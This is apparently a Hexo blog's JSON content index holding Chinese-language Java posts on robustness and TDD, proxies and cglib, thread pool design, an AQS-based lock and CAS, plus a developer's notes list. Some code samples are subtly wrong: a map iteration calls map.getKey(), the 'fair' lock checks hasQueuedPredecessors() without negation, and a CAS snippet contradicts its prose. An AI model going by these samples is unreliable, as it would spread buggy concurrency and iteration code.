{"meta":{"title":"Kayleh","subtitle":"","description":"Dreamaker","author":"Kayleh","url":"https://kayleh.top","root":"/"},"pages":[{"title":"","date":"2020-09-12T08:50:18.120Z","updated":"2020-09-12T08:50:18.120Z","comments":true,"path":"google8102e2f35ce9e391.html","permalink":"https://kayleh.top/google8102e2f35ce9e391.html","excerpt":"","text":"google-site-verification: google8102e2f35ce9e391.html"},{"title":"","date":"2020-09-12T08:50:18.667Z","updated":"2020-09-12T08:50:18.667Z","comments":true,"path":"mainfest.json","permalink":"https://kayleh.top/mainfest.json","excerpt":"","text":"{\"name\":\"Kayleh\",\"short_name\":\"Kayleh\",\"theme_color\":\"#49b1f5\",\"background_color\":\"#49b1f5\",\"display\":\"standalone\",\"scope\":\"/\",\"start_url\":\"/\",\"icons\":[{\"src\":\"images/pwaicons/36.png\",\"sizes\":\"36x36\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/48.png\",\"sizes\":\"48x48\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/72.png\",\"sizes\":\"72x72\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/96.png\",\"sizes\":\"96x96\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/144.png\",\"sizes\":\"144x144\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/192.png\",\"sizes\":\"192x192\",\"type\":\"image/png\"},{\"src\":\"images/pwaicons/512.png\",\"sizes\":\"512x512\",\"type\":\"image/png\"}],\"splash_pages\":null}"},{"title":"ToDoList","date":"2021-02-10T13:22:58.000Z","updated":"2021-02-10T14:00:12.225Z","comments":true,"path":"ToDoList/index.html","permalink":"https://kayleh.top/ToDoList/index.html","excerpt":"","text":"36. 博客低代码开发35. 口罩OpenCV34."},{"title":"友人帐","date":"2020-12-17T06:22:45.695Z","updated":"2020-12-17T06:22:45.695Z","comments":true,"path":"friends/index.html","permalink":"https://kayleh.top/friends/index.html","excerpt":"","text":"本站链接:Name: KaylehBio: 求知若渴,虚心若愚URL: https://kayleh.topAvatar: https://cdn.jsdelivr.net/gh/kayleh/cdn/img/2.jpg"},{"title":"about","date":"2020-02-12T14:14:36.000Z","updated":"2021-01-17T14:44:55.114Z","comments":false,"path":"about/index.html","permalink":"https://kayleh.top/about/index.html","excerpt":"","text":"1234567891011121314 ,-. ,--, ,---, ,--&#x2F; &#x2F;| ,--.&#39;| ,--.&#39; |,--. :&#x2F; | | | : | | :: : &#39; &#x2F; : : &#39; : : :| &#39; &#x2F; ,--.--. .--, | &#39; | ,---. : | |,--.&#39; | : &#x2F; \\ &#x2F;_ .&#x2F;| &#39; | | &#x2F; \\ | : &#39; || | \\ .--. .-. | , &#39; , &#39; : | | : &#x2F; &#x2F; | | | &#x2F;&#39; :&#39; : |. \\ \\__\\&#x2F;: . . &#x2F;___&#x2F; \\: | &#39; : |__ . &#39; &#x2F; | &#39; : | | || | &#39; \\ \\ ,&quot; .--.; | . \\ &#39; | | | &#39;.&#39;| &#39; ; &#x2F;| | | &#39; | :&#39; : |--&#39; &#x2F; &#x2F; ,. | \\ ; : ; : ; &#39; | &#x2F; | | : :_:,&#39;; |,&#39; ; : .&#39; \\ \\ \\ ; | , &#x2F; | : | | | ,&#39;&#39;--&#39; | , .-.&#x2F; : \\ \\ ---&#96;-&#39; \\ \\ &#x2F; &#96;--&#39;&#39; &#96;--&#96;---&#39; \\ &#39; ; &#96;----&#39; &#96;--&#96; Dreamaker Github: https://github.com/Kayleh Google: mailto:kaylehisdied@gmail.com Facebook: https://www.facebook.com/kayleh.yao.7 Twitter: https://twitter.com/y40jinqing Weibo: https://weibo.com/5737136689/profile?rightmod=1&amp;wvr=6&amp;mod=personinfo Zhihu: https://www.zhihu.com/people/ni-hui-gan-xie-wo-de Linkedin: https://www.linkedin.com/in/jinqing-yao-97a750186/"},{"title":"分类","date":"2020-04-20T16:00:00.000Z","updated":"2020-10-11T14:10:12.534Z","comments":false,"path":"categories/index.html","permalink":"https://kayleh.top/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-02-13T12:24:16.000Z","updated":"2021-01-17T15:15:31.982Z","comments":false,"path":"tags/index1.html","permalink":"https://kayleh.top/tags/index1.html","excerpt":"","text":""},{"title":"tags","date":"2021-01-17T15:20:33.347Z","updated":"2021-01-17T15:20:33.347Z","comments":true,"path":"tags/index.html","permalink":"https://kayleh.top/tags/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2020-08-26T05:40:45.000Z","updated":"2021-01-17T13:47:59.812Z","comments":true,"path":"link/index.html","permalink":"https://kayleh.top/link/index.html","excerpt":"","text":"type: link 友情链接Name: KaylehBio: 求知若渴,虚心若愚URL: https://kayleh.topAvatar: https://cdn.jsdelivr.net/gh/kayleh/cdn/img/2.jpg Mi Manchi Aurora 孑然一身 小枫叶 白夜 蝉时雨 会打篮球的程序猿 千羽的编程时光"},{"title":"所有标签","date":"2021-01-17T15:17:15.641Z","updated":"2021-01-17T15:16:55.330Z","comments":true,"path":"tags/index3.html","permalink":"https://kayleh.top/tags/index3.html","excerpt":"","text":""}],"posts":[{"title":"Improve Robustness (2)","slug":"improve-robustness-(2)","date":"2021-05-12T18:49:03.000Z","updated":"2021-05-13T02:54:19.114Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"TDD测试驱动开发用户提供的信息： 用户昵称(长度最长为20个字节，即最长20个英文单词，10个汉字)(必须传入) 用户性别(1代表男，2代表女)(必须传入) 用户出生日期(格式为YYYY-MM-DD)(必须传入) 用户简介(长度最长为40个字节，即最长40个英文单词，20个汉字)(必须传入) 异常情况： 用户没有传入表明用户身份的uuid 用户传入了一个错误的uuid,即不存在的用户 用户没有传入必要的参数，比如缺少用户昵称，用户性别等 用户传了不合法的参数，比如传入了用户的密码 传入的用户昵称为null 传入的用户昵称为””(即空字符串) 传入的用户昵称长度大于20字节 传入的用户昵称为不支持的字符编码 传入的用户性别格式不正确，比如传入’woman’ 传入的用户性别的取值不正确，比如传入了’3’ 传入的用户出生日期格式不正确，比如传入的格式为’YYYY-MM-DD hh:mm:ss’ 传入的用户出生日期取值不正确，比如现在是2017年，他传入的用户年份是2018或者1800，传入的月份是13,等 传入的用户简介为null 传入的用户简介为””(即空字符串) 传入的用户简介长度大于40字节 传入的用户简介为不支持的字符编码 用户传入了正确的数据但是返回的结果不正确 做回归测试我们在修复一个issue,或者增加新的接口的时候，并不能确保我们的修改对其他接口没有影响．所以，我们还需要做回归测试．如果上面写了TDD的测试脚本，那这里我们只需要在这个脚本中新增新接口的测试用例，再执行一遍测试就Ok了．如果没有上面的那个脚本，这里你也很可能就会因为嫌麻烦而不做． 我们项目组中的成员，很多次就是因为没有执行回归测试，而导致新接口能用而旧接口失效的问题． 将生产环境下数据库需要的约束同样加在开发环境下数据库约束其实也是提高我们的代码健壮性的一个好帮手．比如，在新增用户的粉丝接口中(用户和粉丝的关系在一张单独的表中)，我们需要用户传入的粉丝id是一个存在的用户的uuid．如果不用约束，我们需要在代码中先遍历数据库来查询用户是否存在，而如果我们直接使用外键约束，让粉丝id是用户id的外键，那么我们只需要查看数据库是否返回违反外键约束的错误就能确定用户是否存在了． 在修改用户信息的那个例子中，如果你没有先写测试脚本，忘了判断用户昵称是否为空，而你数据库中，用户昵称字段有非空约束．通过传入空昵称时这个非空约束报的错误，你就能知道需要先判断用户昵称是否为空． 永远不要认为你依赖的东西会正常工作作为一个后台微服务，我们一定会用到数据库，会用到缓存．如果你假设数据库不会宕机，并没有处理数据库宕机的代码，那你的代码永远都不够健壮．一旦数据库宕机，前台就会返回大量的500，有心人就会有可乘之机了． 做压力测试有的错误，如果你不做压力测试，是察觉不到的．比如，不正确的并发处理，死锁等问题．对于一个点赞接口来说，如果你用postman来进行测试，点一次结果正确，点两次结果正确，但是你并发的点一万次，结果可能就会因为并发处理不对而是9990了． 如果你没用数据库连接池，网络带宽足够大，并发执行十万次数据库写操作，数据库可能就会因此宕机(至少会有明显的网路延时)，这时候如果你的微服务如果对外提供正确的错误信息，那恭喜，你的代码足够健壮了．","categories":[],"tags":[]},{"title":"Improve Robustness (1)","slug":"improve-robustness-(1)","date":"2021-05-12T07:44:09.000Z","updated":"2021-05-12T15:51:22.995Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"提高代码鲁棒性——（1） 需要 Map 的主键和取值时，应该迭代 entrySet() 当循环中只需要 Map 的主键时，迭代 keySet() 是正确的。但是，当需要主键和取值时，迭代 entrySet() 才是更高效的做法，比先迭代 keySet() 后再去 get 取值性能更佳。 反例： 12345Map&lt;String,String&gt; map = new HashMap();for(String key : map.keySet())&#123; String value = map.get(key);&#125; 正例： 1234567Map&lt;String,String&gt; map = new HashMap();for(Map.Entry&lt;String,String&gt; entry:map.entrySet())&#123; String key = map.getKey(); String value = entry.getValue(); ...&#125; 不要让常量变成变量 12","categories":[],"tags":[]},{"title":"Proxy","slug":"proxy","date":"2021-04-25T05:37:43.000Z","updated":"2021-04-25T13:44:45.051Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"代理模式是一种经典的设计模式，代理的意义在于生成代理对象，在服务提供方和使用方之间充当一个媒介，控制真实对象的访问。 代理分为静态代理和动态代理两种。 静态代理需要通过手动或工具生成代理类并编译，代理类和委托类的关系在编译期就已经确定。动态代理允许开发人员在运行时动态的创建出代理类及其对象。 Spring AOP 的主要技术基础就是 Java 的动态代理机制。 静态代理静态代理的实现需要一个接口(表示要完成的功能)，一个真实对象和一个代理对象(两者都需实现这个接口)。 示例如下： 12345678910111213141516171819202122232425262728293031323334interface Shopping &#123; void buy();&#125;class Client implements Shopping &#123; public void buy() &#123; System.out.println(\"我想买这件商品\"); &#125;&#125;class StaticProxy implements Shopping &#123; private Shopping shopping; public StaticProxy(Shopping shopping) &#123; this.shopping = shopping; &#125; public void buy() &#123; System.out.println(\"降价促销，疯狂大甩卖了！\"); shopping.buy(); &#125;&#125;public class StaticProxyTest &#123; public static void main(String[] args) &#123; Client client = new Client(); StaticProxy service = new StaticProxy(client); service.buy(); &#125;&#125;-----------------------------------------输出结果：降价促销，疯狂大甩卖了！我想买这件商品 动态代理动态代理可以让我们在运行时动态生成代理类，解耦程度更高。Java 动态代理的实现主要借助于 java.lang.reflect 包中的 Proxy 类与 InvocationHandler 接口，所有对动态代理对象的方法调用都会转发到 InvocationHandler 中的 invoke() 方法中实现。一般我们称实现了 InvocationHandler 接口的类为调用处理器。 我们可以通过 Proxy 的静态工厂方法 newProxyInstance 创建动态代理类实例。 方法如下： 123public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) loader：类加载器interfaces：类实现的全部接口h：调用处理器 示例如下： public class DynamicProxy implements InvocationHandler { private Object target = null; DynamicProxy(Object target) { this.target = target; } /** * 代理方法逻辑 * * @param proxy 代理对象 * @param method 调度方法 * @param args 调度方法参数 */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(&quot;代理前&quot;); method.invoke(target, args); System.out.println(&quot;代理后&quot;); return null; } } 12345678910111213public class DyProxyTest &#123; public static void main(String[] args) &#123; Shopping client = new Client(); DynamicProxy dyProxy = new DynamicProxy(client); Shopping shop = (Shopping) Proxy.newProxyInstance(Shopping.class.getClassLoader(), new Class[]&#123;Shopping.class&#125;, dyProxy); shop.buy(); &#125;&#125;输出结果：代理前我想买这件商品代理后 当然我们也可以将 Proxy.newProxyInstance 方法放到调用处理器中，使客户端编程更为简单。 示例如下： 123456789101112131415161718192021222324252627282930public class DynamicProxy implements InvocationHandler &#123; private Object target = null; DynamicProxy() &#123; &#125; DynamicProxy(Object target) &#123; this.target = target; &#125; public Object bind(Object target) &#123; this.target = target; return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this); &#125; /** * 代理方法逻辑 * * @param proxy 代理对象 * @param method 调度方法 * @param args 调度方法参数 */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(\"代理前\"); method.invoke(target, args); System.out.println(\"代理后\"); return null; &#125;&#125; 12345678public class DyProxyTest &#123; public static void main(String[] args) &#123; Shopping client = new Client(); DynamicProxy dyProxy = new DynamicProxy(); Shopping shop = (Shopping) dyProxy.bind(client); shop.buy(); &#125;&#125; 拦截器拦截器主要就是靠动态代理实现，它可以简化动态代理的使用，我们只需要知道拦截器接口的使用方法即可，无须知道动态代理的实现细节。 示例如下： public interface Interceptor { public boolean before(Object proxy, Object target, Method method, Object[] args); public void around(Object proxy, Object target, Method method, Object[] args); public void after(Object proxy, Object target, Method method, Object[] args); } public class MyInterceptor implements Interceptor { @Override public boolean before(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;before&quot;); return false; } @Override public void around(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;around&quot;); } @Override public void after(Object proxy, Object target, Method method, Object[] args) { System.out.println(&quot;after&quot;); } } 1234567891011121314151617181920212223242526272829303132333435public class InterceptorProxy implements InvocationHandler &#123; private Object target = null; Interceptor interceptor = null; InterceptorProxy(Interceptor interceptor) &#123; this.interceptor = interceptor; &#125; public Object bind(Object target) &#123; this.target = target; return Proxy.newProxyInstance(target.getClass().getClassLoader(), target.getClass().getInterfaces(), this); &#125; /** * 代理方法逻辑 * * @param proxy 代理对象 * @param method 调度方法 * @param args 调度方法参数 */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; if (interceptor == null) &#123; method.invoke(target, args); &#125; Object result = null; if (interceptor.before(proxy, target, method, args)) &#123; result = method.invoke(target, args); &#125; else &#123; interceptor.around(proxy, target, method, args); &#125; interceptor.after(proxy, target, method, args); return result; &#125;&#125; 输出结果： beforearoundafter 开发者只需要知道拦截器的作用，设置拦截器，因而相对简单一些。 拦截器在 Spring AOP 与 Spring MVC 中都有应用。在 Spring AOP 中， 针对接口做代理默认使用的是 JDK 自带的 Proxy+InvocationHandler 针对类做代理使用的是 Cglib 在 Spring MVC中， 主要通过 HandlerInterceptor 接口实现拦截器的功能。 HandlerInterceptor 接口中包含3个方法： preHandle：执行 controller 处理之前执行，返回值为true时接着执行 postHandle 和 afterCompletion，返回false则中断执行 postHandle：在执行 controller 后，ModelAndView 处理前执行 afterCompletion ：在执行完 ModelAndView 之后执行此外，Spring MVC 提供了抽象类 HandlerInterceptorAdapter，实现了 HandlerInterceptor 接口。 cglib因为 Java 自带的动态代理工具必须要有一个接口，cglib 不需要接口，只需要一个非抽象类就能实现动态代理。 示例如下： 123456789101112131415161718192021class ClientProxy implements MethodInterceptor &#123; @Override public Object intercept(Object proxy, Method method, Object[] args, MethodProxy methodProxy) throws Throwable &#123; System.out.println(\"before\"); Object obj = methodProxy.invokeSuper(proxy, args); System.out.println(\"after\"); return obj; &#125;&#125;public class CglibTest &#123; public static void main(String[] args) &#123; ClientProxy clientProxy = new ClientProxy(); Enhancer enhancer = new Enhancer(); enhancer.setSuperclass(Client.class); enhancer.setCallback(clientProxy); Client client = (Client) enhancer.create(); client.buy(); &#125;&#125; 输出结果： before我想买这件商品after ————————————————版权声明：本文为CSDN博主「情谊风月」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/weixin_43320847/article/details/82938754","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://kayleh.top/tags/java/"}]},{"title":"todoList","slug":"note","date":"2021-04-23T07:53:25.000Z","updated":"2021-05-20T02:25:51.973Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"笔记TodoList https://www.cnblogs.com/lenve/p/11242055.html 数据库 数据库查询不能整表查询，应创建实体类接收返回给前端 bit类型数据是 int类型(1&amp;0) SQLException：TimeZone 解决方式:在连接数据库的url后加上serverTimezone=UTC，完整的url为: 1url=jdbc:mysql://localhost:3306/spring_cache?useUnicode=true&amp;characterEncoding=UTF8&amp;serverTimezone=UTC mysqldump 设置字符集 ```cmdmysqldump -u root -p —default-character-set=utf8mb4 dev &gt; D:/dev.sql alter table table_name convert to character set utf8mb4; 1234567891011121314151617- mybatis-plus：SQL脚本固定字段 &#96;&#96;&#96;mysql CREATE TABLE &#96;table&#96; ( &#96;_id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;??定义表&#39;, &#96;id&#96; varchar(50) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;主键Id&#39;, &#96;deleted&#96; bit(1) NOT NULL DEFAULT b&#39;0&#39; COMMENT &#39;是否删除&#39;, &#96;version&#96; int(11) NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;乐观锁&#39;, &#96;create_userid&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;创建用户Id&#39;, &#96;create_username&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;创建用户名称&#39;, &#96;create_time&#96; timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) COMMENT &#39;创建时间&#39;, &#96;update_userid&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;更新用户Id&#39;, &#96;update_username&#96; varchar(255) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;更新用户名称&#39;, &#96;update_time&#96; timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3) COMMENT &#39;更新时间&#39;, PRIMARY KEY (&#96;_id&#96;) ) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8mb4 COMMENT&#x3D;&#39;??定义表&#39;; 小程序、前端 12module.exports &#x3D; &#123;&#125; &#x2F;&#x2F;暴露？全局变量？ 12345query -query是传参数用的。 -上个页面或者那个页面跳转传过来的 -小程序打开的地址链接是可以带请求参数的，跟url的很类似，例如：sdfasdf?abc=123&amp;bcd=234&amp;cde=345。 这个意思是在小程序启动时获取mpid并向全局变量里进行赋值 网络 ResponseEntity 1.ResponseEntity的优先级高于@ResponseBody。在不是ResponseEntity的情况下才去检查有没有@ResponseBody注解。如果响应类型是ResponseEntity可以不写@ResponseBody注解，写了也没有关系。2.ResponseEntity 是在 org.springframework.http.HttpEntity 的基础上添加了http status code(http状态码)，用于RestTemplate以及@Controller的HandlerMethod。它在Controoler中或者用于服务端响应时，作用是和@ResponseStatus与@ResponseBody结合起来的功能一样的。用于RestTemplate时，它是接收服务端返回的http status code 和 reason的。3.总结： 简单粗暴的讲 @ResponseBody可以直接返回Json结果， @ResponseEntity不仅可以返回json结果，还可以定义返回的HttpHeaders和HttpStatus 框架 @EqualsAndHashCode(callSuper = true)//lombok的一个方法 @EnableScheduling spring security（JWT、OAUTH2、）鉴权 https://kayleh.top/head-first-security mybatis-plus https://mp.baomidou.com/guide/ Field baseMapper in com.xxx required a single bean,but 100 were found ————Mybatis-Plus 报错发生时间：项目启动时。 报错英文描述：Field baseMapper in com.xxx required a single bean,but 100 were found 报错信息中文描述：文件baseMapper只需要一个bean服务，但是到了多个，所以它不知道选哪个解决： 123情况一：你的这个类其实不需要操作到数据库，所以这个时候直接把继承IService给去掉就好。情况二：你的这个类需要操作到数据库，那么就把相应的泛型给加上，这样它就知道你到底要找的是哪个mapper。 基础 生成随机字符串入库时，最好不要用UUID.因为UUID生成的字符串中有字母，在业务中，使用到带字母和数字组合的字符串不常用，最好使用 ```javamath.random()范围是[0.0, 1.0)，那么math.random()9+1一定是小于10的，(Math.random()9+1)100000一定是&lt;10100000=1000000的一个数12345678910 - - 判空(null &#x3D;&#x3D; ?)- 序列化版本号？- 拼接字符串 &#96;&#96;&#96;java String.join(&quot;,&quot;, List); getConstructor和getDeclaredConstructor Class类的getConstructor()方法,无论是否设置setAccessible(),都不可获取到类的私有构造器.Class类的getDeclaredConstructor()方法,可获取到类的私有构造器(包括带有其他修饰符的构造器），但在使用private的构造器时，必须设置setAccessible()为true,才可以获取并操作该Constructor对象。 多线程 wait()的作用是让当前线程进入等待状态，同时，wait()也会让当前线程释放它所持有的锁。“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法”，当前线程被唤醒(进入“就绪状态”)","categories":[],"tags":[]},{"title":"Thread Pool","slug":"Thread-pool","date":"2021-04-20T08:37:35.000Z","updated":"2021-04-20T16:51:26.692Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"异步执行的代码 1new Thread(r).start(); 统一的工具类，定一个接口来实现。 123public interface Executor &#123; public void execute(Runnable r);&#125; 123456// 新线程：直接创建一个新线程运行class FlashExecutor implements Executor &#123; public void execute(Runnable r) &#123; new Thread(r).start(); &#125;&#125; 假如有 10000 个人都调用这个工具类提交任务，那就会创建 10000 个线程来执行，这肯定不合适吧！能不能控制一下线程的数量呢？ 可以把这个任务 r 丢到一个 tasks 队列中，然后只启动一个线程，就叫它 Worker 线程吧，不断从 tasks 队列中取任务，执行任务。这样无论调用者调用多少次，永远就只有一个 Worker 线程在运行，像这样。 这个设计有了三个重大的意义： \\1. 控制了线程数量。 \\2. 队列不但起到了缓冲的作用，还将任务的提交与执行解耦了。 \\3. 最重要的一点是，解决了每次重复创建和销毁线程带来的系统开销。 不过只有一个后台的工作线程 Worker 会不会少了点？还有如果这个 tasks 队列满了怎么办呢？ Worker 线程的数量要增加，但是具体数量要让使用者决定，调用时传入，就叫核心线程数 corePoolSize 吧。 这样设计。 \\1. 初始化线程池时，直接启动 corePoolSize 个工作线程 Worker 先跑着。 \\2. 这些 Worker 就是死循环从队列里取任务然后执行。 \\3. execute 方法仍然是直接把任务放到队列，但队列满了之后直接抛弃 初始化的时候，就创建了一堆 Worker 线程在那空跑着，假如此时并没有异步任务提交过来执行，这就有点浪费了。 队列一满，就直接把新任务丢弃了，这样有些粗暴，能不能让调用者自己决定该怎么处理呢？ 改进 1. 按需创建Worker：刚初始化线程池时，不再立刻创建 corePoolSize 个工作线程，而是等待调用者不断提交任务的过程中，逐渐把工作线程 Worker 创建出来，等数量达到 corePoolSize 时就停止，把任务直接丢到队列里。那就必然要用一个属性记录已经创建出来的工作线程数量，就叫 workCount 吧。 2. 加拒绝策略：实现上就是增加一个入参，类型是一个接口 RejectedExecutionHandler，由调用者决定实现类，以便在任务提交失败后执行 rejectedExecution 方法。 3. 增加线程工厂：实现上就是增加一个入参，类型是一个接口 ThreadFactory，增加工作线程时不再直接 new 线程，而是调用这个由调用者传入的 ThreadFactory 实现类的 newThread 方法。 就像下面这样。 在这个场景里，弹性就是在任务提交比较频繁，和任务提交非常不频繁这两种情况下，你这个代码是否有问题？ 这个线程池，当提交任务的量突增时，工作线程和队列都被占满了，就只能走拒绝策略，其实就是被丢弃掉 调用方可以通过设置很大的核心线程数 corePoolSize 来解决这个问题 可以，但一般场景下 QPS 高峰期都很短，而为了这个很短暂的高峰，设置很大的核心线程数，简直太浪费资源了 最大线程数 maximumPoolSize。当核心线程数和队列都满了时，新提交的任务仍然可以通过创建新的工作线程（叫它非核心线程），直到工作线程数达到 maximumPoolSize 为止，这样就可以缓解一时的高峰期了，而用户也不用设置过大的核心线程数。 \\1. 开始的时候和上一版一样，当 workCount &lt; corePoolSize 时，通过创建新的 Worker 来执行任务。 \\2. 当 workCount &gt;= corePoolSize 就停止创建新线程，把任务直接丢到队列里。 \\3. 但当队列已满且仍然 workCount &lt; maximumPoolSize 时，不再直接走拒绝策略，而是创建非核心线程，直到 workCount = maximumPoolSize，再走拒绝策略。 这样 corePoolSize 就负责平时大多数情况所需要的工作线程数，而 maximumPoolSize 就负责在高峰期临时扩充工作线程数。 高峰时期的弹性搞定了，那自然就还要考虑低谷时期。当长时间没有任务提交时，核心线程与非核心线程都一直空跑着，浪费资源。我们可以给非核心线程设定一个超时时间 keepAliveTime，当这么长时间没能从队列里获取任务时，就不再等了，销毁线程。 这回线程池在 QPS 高峰时可以临时扩容，QPS 低谷时又可以及时回收线程（非核心线程）而不至于浪费资源，真的显得十分 Q 弹呢。 总结构造方法 1234567891011121314151617public FlashExecutor( int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123; ... // 省略一些参数校验 this.corePoolSize = corePoolSize; this.maximumPoolSize = maximumPoolSize; this.workQueue = workQueue; this.keepAliveTime = unit.toNanos(keepAliveTime); this.threadFactory = threadFactory; this.handler = handler;&#125; 这些参数分别是 int corePoolSize：核心线程数 int maximumPoolSize：最大线程数 long keepAliveTime：非核心线程的空闲时间 TimeUnit unit：空闲时间的单位 BlockingQueue workQueue：任务队列（线程安全的阻塞队列） ThreadFactory threadFactory：线程工厂 RejectedExecutionHandler handler：拒绝策略 整个任务的提交流程是","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://kayleh.top/tags/Concurrency/"}]},{"title":"a Lock Based on ReentrantLock","slug":"Implement-a-lock-based-on-ReentrantLock","date":"2021-04-19T08:59:25.000Z","updated":"2021-04-19T17:26:04.313Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"基于 ReentrantLock实现一个锁12345678910111213141516171819202122232425262728293031323334353637383940414243package aqsLock;import java.util.concurrent.locks.AbstractQueuedSynchronizer;/** * @Author: Kayleh * @Date: 2021/4/20 0:57 */public class aqsLock&#123; public void lock() &#123; sync.acquire(1); &#125; public void unlock() &#123; sync.release(1); &#125; private final Sync sync = new Sync(); public static class Sync extends AbstractQueuedSynchronizer &#123; @Override protected boolean tryAcquire(int arg) &#123; // CAS 方式尝试获取锁，成功返回true，失败返回false if (compareAndSetState(0, 1)) return true; return false; &#125; @Override protected boolean tryRelease(int arg) &#123; // 释放锁 setState(0); return true; &#125; &#125;&#125; 基本功能实现，测试： 12345678910111213141516171819202122232425262728293031// 可能发生线程安全问题的共享变量private static long count = 0;// 两个线程并发对 count++public static void main(String[] args) throws Exception &#123; // 创建两个线程，执行add()操作 Thread th1 = new Thread(()-&gt; add()); Thread th2 = new Thread(()-&gt; add()); // 启动两个线程 th1.start(); th2.start(); // 等待两个线程执行结束 th1.join(); th2.join(); // 这里应该是 20000 就对了，说明锁生效了 System.out.println(count);&#125;// 我画了一上午写出来的锁，哈哈private static ExampleLock exampleLock = new ExampleLock();// 循环 count++，进行 10000 次private static void add() &#123; exampleLock.lock(); for (int i = 0; i &lt; 10000; i++) &#123; count++; &#125; add2(); // 没啥异常，我就直接释放锁了 exampleLock.unlock();&#125; 非公平锁，因为线程抢锁不排队，纯看脸。 实现的排队获取锁，叫公平锁，因为只要有线程在排队，新来的就得乖乖去排队，不能直接抢。 实现一个公平锁123456789101112@Overridepublic boolean tryAcquire(int acquires) &#123; // 原有基础上加上这个 if (有线程在等待队列中) &#123; // 返回获取锁失败，AQS会帮我把该线程放在等待队列队尾的 return false; &#125; if (compareAndSetState(0, 1)) &#123; return true; &#125; return false;&#125; 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package aqsLock;import java.util.concurrent.locks.AbstractQueuedSynchronizer;/** * @Author: Kayleh * @Date: 2021/4/20 0:57 */public class aqsLock&#123; public aqsLock(boolean fair) &#123; sync = fair ? new Sync() : new NofairSync(); &#125; public void lock() &#123; sync.acquire(1); &#125; public void unlock() &#123; sync.release(1); &#125; private Sync sync = new Sync(); public static class Sync extends AbstractQueuedSynchronizer &#123; @Override protected boolean tryAcquire(int arg) &#123; // CAS 方式尝试获取锁，成功返回true，失败返回false if (hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, 1)) return true; return false; &#125; @Override protected boolean tryRelease(int arg) &#123; // 释放锁 setState(0); return true; &#125; &#125; public static class NofairSync extends Sync &#123; @Override protected boolean tryAcquire(int arg) &#123; // CAS 方式尝试获取锁，成功返回true，失败返回false if (compareAndSetState(0, 1)) return true; return false; &#125; @Override protected boolean tryRelease(int arg) &#123; // 释放锁 setState(0); return true; &#125; &#125;&#125; 工具会导致一个线程卡死，一直获取不到锁 实现方法可以重入1234567891011public void doSomeThing2() &#123; flashLock.lock(); doSomeThing2(); flashLock.unlock();&#125;public void doSomeThing2() &#123; flashLock.lock(); ... flashLock.unlock();&#125; 一个线程执行了一个方法，获取了锁，这个方法没有结束，又调用了另一个需要锁的方法，于是卡在这再也不走了。 怎么 让同一个线程持有锁时，还能继续获取锁（可重入），只有当不同线程才互斥呢？ 1234567891011121314151617@Overridepublic boolean tryAcquire(int acquires) &#123; final Thread current = Thread.currentThread(); int c = getState(); if (c == 0) &#123; if (hasQueuedPredecessors() &amp;&amp; compareAndSetState(0, 1)) &#123; // 拿到锁记得记录下持锁线程是自己 setExclusiveOwnerThread(current); return true; &#125; &#125; else if (current == getExclusiveOwnerThread()) &#123; // 看见锁被占了(state!=0)也别放弃，看看是不是自己占的 setState(c + acquires); return true; &#125; return false;&#125;","categories":[],"tags":[{"name":"Concurrency","slug":"Concurrency","permalink":"https://kayleh.top/tags/Concurrency/"}]},{"title":"CAS & AQS","slug":"CAS-and-AQS","date":"2021-04-18T09:43:22.000Z","updated":"2021-04-19T17:00:07.119Z","comments":true,"path":"undefined/","link":"","permalink":"https://kayleh.top/undefined/","excerpt":"","text":"CAS（Compare And Swap）原理分析字面意思是比较和交换，先看看下面场景（A 和 B 线程同时执行下面的代码）： 12int i = 10; //代码1i = 10; //代码2 场景 1：A 线程执行代码 1 和代码 2，然后 B 线程执行代码 1 和代码 2，CAS 成功。 场景 2：A 线程执行代码 1，此时 B 线程执行代码 1 和代码 2，A 线程执行代码 2，CAS 不成功，为什么呢？ 因为 A 线程执行代码 1 时候会旧值（i 的内存地址的值 10）保存起来，执行代码 2 的时候先判断 i 的最新值（可能被其他线程修改了）跟旧值比较，如果相等则把 i 赋值为 20，如果不是则 